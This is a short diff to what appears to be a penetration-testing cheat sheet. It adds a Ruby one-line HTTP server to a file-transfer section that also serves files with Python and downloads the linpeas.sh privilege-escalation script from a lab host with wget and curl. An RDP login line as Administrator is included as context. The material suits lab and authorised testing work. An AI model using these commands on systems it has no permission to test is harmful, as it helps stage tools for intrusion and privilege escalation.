@@ -110,6 +110,7 @@ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip:3389 /u:Administrato
 # File_Transfer ✅
 ## linux ✅
 ```bash
+ruby -run -ehttpd . -p8000
 python3 -m http.server 8000
 wget http://10.10.10.10:8000/linpeas.sh
 curl http://10.10.10.10:8000/linpeas.sh -O linpeas.sh
